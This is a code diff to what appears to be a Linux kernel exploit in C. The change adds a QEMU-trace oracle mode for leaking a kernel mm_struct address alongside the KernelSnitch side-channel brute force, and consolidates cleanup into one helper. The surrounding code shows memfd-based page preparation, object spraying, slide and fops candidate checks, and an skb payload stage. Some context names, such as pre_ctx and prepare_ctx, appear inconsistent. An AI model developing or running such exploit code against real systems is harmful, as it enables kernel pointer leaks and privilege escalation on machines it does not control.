@@ -490,6 +490,17 @@ uintptr_t cleanup_kernelsnitch(void) {
 #endif
 }
 
+static void cleanup_mm_search_state(void) {
+#if MM_SEARCH_MODE == 2
+  return;
+#else
+  if (ks) {
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+  }
+#endif
+}
+
 void read_first_line(const char *path, char *buf, size_t len) {
   if (!len) {
     return;
@@ -910,6 +921,32 @@ pid_t clone_child(void) {
   }
   return child;
 }
+
+#if defined(QEMU_MM_TRACE_ORACLE) && QEMU_MM_TRACE_ORACLE
+int qemu_mm_oracle_leak(uintptr_t *mm_out, int *memfd_out) {
+  pid_t child;
+  int fd;
+
+  if (!mm_out || !memfd_out || !qemu_mm_trace_drain()) {
+    return 0;
+  }
+  *mm_out = 0;
+  *memfd_out = -1;
+
+  child = clone_child();
+  fd = open_memfd(child);
+  if (!qemu_mm_trace_read(mm_out)) {
+    close(fd);
+    kill_child(child);
+    return 0;
+  }
+  kill_child(child);
+  *memfd_out = fd;
+  pr_info("qemu mm oracle captured mm=%016zx memfd=%d pid=%d\n",
+          *mm_out, fd, getpid());
+  return 1;
+}
+#endif
 
 pid_t clone_leak_child(void) {
 #if defined(QEMU_MM_TRACE_VALIDATE) && QEMU_MM_TRACE_VALIDATE
@@ -2121,6 +2158,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t leaked = 0;
+#if MM_SEARCH_MODE != 2
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
@@ -2154,11 +2193,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 #endif
 #endif
+#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
   }
+#if MM_SEARCH_MODE == 2
+  if (!qemu_mm_oracle_leak(&leaked, &memfd_leak)) {
+    pr_warning("qemu mm oracle leak failed\n");
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#else
   child_leak = clone_leak_child();
+#endif
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.childs[i] = clone_child();
   }
@@ -2166,7 +2217,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
+#if MM_SEARCH_MODE != 2
   memfd_leak = open_memfd(child_leak);
+#endif
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
@@ -2186,7 +2239,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
     spray_ctx.childs[i] = -1;
   }
+#if MM_SEARCH_MODE != 2
   SYSCHK(waitpid(child_leak, NULL, 0));
+#endif
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
@@ -2194,13 +2249,13 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   log_mm_slabinfo("after-child-exit");
 #endif
 
+#if MM_SEARCH_MODE != 2
   if (!kernelsnitch_found_collisions(ks)) {
     pr_warning("KernelSnitch collision finding failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("collision");
 #else
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2208,16 +2263,18 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     return 0;
   }
+#endif
 
+#if MM_SEARCH_MODE != 2
   kernelsnitch_bruteforce(ks);
-  uintptr_t leaked = ks->mm_struct;
-  if (leaked == (uintptr_t)-1) {
-    pr_warning("KernelSnitch mm_struct leak failed\n");
+  leaked = ks->mm_struct;
+#endif
+  if (leaked == 0 || leaked == (uintptr_t)-1) {
+    pr_warning("mm_struct search failed mode=%d\n", MM_SEARCH_MODE);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("mm-leak");
 #else
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2226,15 +2283,16 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if MM_SEARCH_MODE != 2
   leaked = canonicalize_kernelsnitch_pointer(leaked);
+#endif
   log_mm_slabinfo("after-leak");
 #endif
 
 #if defined(QEMU_MM_TRACE_VALIDATE) && QEMU_MM_TRACE_VALIDATE
   if (!qemu_mm_oracle_valid) {
     pr_warning("qemu mm validate missing oracle for leaked=%016zx\n", leaked);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2248,8 +2306,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   if (leaked != qemu_mm_oracle_mm) {
     pr_warning("qemu mm validate mismatch ks=%016zx actual=%016zx\n",
                leaked, qemu_mm_oracle_mm);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2269,8 +2326,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
                payload_mode, base,
                (unsigned long long)APP_RECLAIM_MAX_DIRECT_BASE);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2284,8 +2340,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
     pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
                object_index, APP_SLIDE_MIN_OBJECT_INDEX);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2299,8 +2354,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       object_index > APP_SLIDE_MAX_OBJECT_INDEX) {
     pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
                object_index, APP_SLIDE_MAX_OBJECT_INDEX);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2314,8 +2368,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       object_index < APP_FOPS_MIN_OBJECT_INDEX) {
     pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
                object_index, APP_FOPS_MIN_OBJECT_INDEX);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2337,8 +2390,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("skb-payload");
 #else
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
+    cleanup_mm_search_state();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -2572,8 +2624,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
           payload_mode, base);
 #endif
-  kernelsnitch_cleanup(ks);
-  ks = NULL;
+  cleanup_mm_search_state();
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
           payload_mode);
